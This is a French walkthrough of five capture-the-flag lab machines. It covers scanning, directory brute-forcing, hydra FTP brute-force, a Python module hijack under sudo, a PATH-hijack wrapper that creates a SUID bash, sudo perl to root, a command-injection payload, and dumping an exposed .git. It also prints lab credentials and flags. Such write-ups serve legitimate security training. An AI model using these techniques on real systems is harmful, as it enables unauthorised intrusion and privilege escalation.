# Guide — Résolution des machines (TryHackMe)

# 1) E‑Corp (user.txt)

**Étapes** :

1. Scanner la machine :

```bash
nmap -sC -sV -A 10.10.120.246
```

2. Découvrir l'interface web :

```bash
curl http://10.10.120.246/login/
# Inspecter le code source, on trouve un commentaire :
# <!-- Remember the company policy: color + two digits number -->
```

3. Interroger l'API hint :

```bash
curl http://10.10.120.246/api/user/passwordhint/elliot
# Réponse : {"hint":"All is not black or white","username":"elliot"}
```

4. Interprétation de l'indice : « All is not black or white » → **gris** (gray/grey) + **2 chiffres**.

   * Construire un dictionnaire contenant les variantes `gray`/`grey` + combinaisons de 2 chiffres (00–99).
   * Tester les combinaisons via l'API web jusqu'à obtenir les bonnes credentials.

5. Credentials trouvés : `elliot:Im_M1st3r_R0b0T`

```bash
ssh elliot@10.10.120.246
cat /home/elliot/user.txt
```

---

# 2) Toss a Coin (user.txt + root.txt)

**Résumé rapide** : découverte d'un site avec énigme lyrique, récupération d'identifiants via source HTML, élévation de privilèges par `sudo` et manipulation de PATH pour obtenir un binaire SUID exploitant `date`.

**Étapes** :

1. Scan et discovery :

```bash
nmap -sV 10.10.179.5
gobuster dir -u http://10.10.179.5/ -w /usr/share/wordlists/dirb/common.txt
# répertoires intéressants : /img et /t
```

2. Le site contient la phrase répétée « Do you know the lyrics? ». Suivre les chemins pour arriver à la page finale (lettre par lettre) :

```
http://10.10.179.5/t/o/s/s/_/a/_/c/o/i/n/_/.../w/i/t/c/h/e/r/
```

3. La page finale affiche "So you DO know the lyrics..." — regarder le code source HTML.

   * On trouve une ligne cachée contenant les credentials :

```
jaskier:YouHaveTheMostIncredibleNeckItsLikeASexyGoose
```

4. SSH avec `jaskier` :

```bash
ssh jaskier@10.10.179.5
cat user.txt
# Flag user : EPI{R3Sp3C7_D03sNT_M4k3_h1S70rY}
```

5. Vérifier `sudo -l` :

   * L'utilisateur peut exécuter `/usr/bin/python3.6 /home/jaskier/toss-a-coin.py` en tant que `yen`.

6. Exploitation (`python` importe `random`) :

```bash
# Créer un faux module random qui spawn un shell
echo 'import os; os.system("/bin/bash")' > /home/jaskier/random.py
# Lancer le script en tant que yen
sudo -u yen /usr/bin/python3.6 /home/jaskier/toss-a-coin.py
# On obtient un shell en tant que yen
```

7. Trouver binaire SUID root `/home/yen/portal` qui exécute : `date --date=next hour`.

   * Préparer un répertoire contrôlé dans PATH et substituer `date` par un wrapper qui copie `bash` setuid :

```bash
mkdir /tmp/exploit && cd /tmp/exploit
cat > date << 'EOF'
#!/bin/bash
/bin/date --date="next hour" -R
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
chmod +x date
export PATH=/tmp/exploit:$PATH
cd /home/yen && ./portal
# Maintenant /tmp/rootbash est SUID sur l'owner (geralt)
/tmp/rootbash -p
# shell avec euid=geralt
```

8. Récupérer la password de geralt et se connecter :

```bash
cd /home/geralt && cat password.txt  # => IH4teP0rt4ls
su geralt
# password : IH4teP0rt4ls
```

9. En tant que geralt, `sudo -l` montre que perl peut être exécuté en root.

```bash
sudo /usr/bin/perl -e 'exec "/bin/bash"'
cat /root/root.txt
# Flag root : EPI{D3s71Ny_1s_Ju5t_Th3_3mB0D1m3Nt_0f_Th3_S0uL_S_D3s1R3_T0_Gr0W}
```

---

# 3) Secret of the maw (user.txt)

**Résumé rapide** : découverte d'un répertoire via `gobuster`, formulaire avec champ "discrete", injection de commande via l'interface qui exécute `sudo -u six .musicbox`.

**Étapes** :

1. Lancer gobuster :

```bash
gobuster dir -u http://<IP_ADRESSE> -w ../medium.txt
```

2. Trouver la page `discrete`. Dans le champ mot de passe, entrer la charge utile :

```text
echo "head /home/six/user.txt" | sudo -u six /home/six/.musicbox
```

3. Le site renvoie une sortie contenant le flag :

```
You entered head /home/six/user.txt
EPI{I_MuS7_F1nD_@_W4y_0Ut}
```

---

# 4) Yer a wizard (user.txt)

**Résumé rapide** : brute-force FTP, récupération d'un mot de passe caché dans un fichier `.ReallyHidden`, SSH + base64 (décodages répétés) pour obtenir le flag.

**Étapes** :

1. Scanner puis brute‑force FTP si besoin :

```bash
nmap -Pn -p- <IP_ADRESSE>
hydra -L users.txt -P users.txt ftp://<IP_ADRESSE> -t 4 -vV
```

2. Connexion FTP anonyme possible : `anonymous:anonymous`.

   * Récupérer le fichier caché :

```bash
get .ReallyHidden
cat .ReallyHidden  # contient : FINE! My password is IAlreadySaidTooMuch.
```

3. SSH avec `hagrid` (ou autre user) en utilisant le mot de passe trouvé, puis récupérer `user.txt` qui contient une chaîne encodée en base64 plusieurs fois.

4. Décoder plusieurs fois :

```bash
echo "<chaine1>" | base64 -d
# répéter jusqu'à obtenir le flag final : EPI{0n3_kaN_n3v3R_haV3_3n0U9H_50CK2}
```

---

# 5) Grandline (user.txt)

**Résumé rapide** : découverte d'un dépôt `.git` exposé dans un répertoire `lost`, récupération d'une clé/credential dans l'historique git, utilisation de l'API pour créer un compte et SSH.

**Étapes** :

1. Reconnaissance :

```bash
nmap <IP_ADRESSE>
gobuster dir -u http://<IP_ADRESSE>/ -w ../common.txt
# trouver /lost
gobuster dir -u http://<IP_ADRESSE>/lost -w ../medium.txt
# trouver .git
```

2. Récupérer le dépôt `.git` :

```bash
wget -r -np -R "index.html*" http://<IP_ADRESSE>/lost/.git/
# puis inspecter les commits (git show, git log, etc.)
```

3. Chercher dans les commits une clé/API token laissée par erreur, puis l'utiliser :

```bash
curl -X POST http://<IP_ADRESSE>/api/zoro
# réponse : {"username":"zoro","password":"1_G07_L0S7_0Nc3_4G41n"}
```

4. SSH avec `zoro` et récupérer `user.txt` :

```bash
ssh zoro@<IP_ADRESSE>
cat /home/zoro/user.txt
# Flag user : EPI{1f_1_91V3_uP_noW_1M_9o1N9_7O_r39R37_17}
```
